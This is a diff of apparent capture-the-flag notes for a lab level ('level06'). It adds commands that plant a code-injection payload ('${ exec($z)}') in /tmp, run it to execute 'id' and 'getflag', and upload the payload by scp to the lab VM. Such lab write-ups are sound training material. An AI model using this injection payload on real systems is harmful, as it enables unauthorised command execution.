@@ -1,3 +1,15 @@
-1. `scp -P 4242 ./level06/Ressources/playload level06@192.168.56.102:/tmp`
+#--------- CMD ---------
 
-2. `echo './level06 /tmp/playload 'getflag'`
+1. `echo 'hello' > /tmp/payload && ./level06 /tmp/payload`
+    hello
+
+2. `echo '[x $z]' > /tmp/payload && ./level06 /tmp/payload 'id'`
+    id
+
+3. `echo '[x ${ exec($z)}]' > /tmp/payload && ./level06 /tmp/payload 'getflag'`
+
+#--------- SCP ---------
+
+1. `scp -P 4242 ./level06/Ressources/payload level06@192.168.56.102:/tmp`
+
+2. `echo './level06 /tmp/payload 'getflag'`
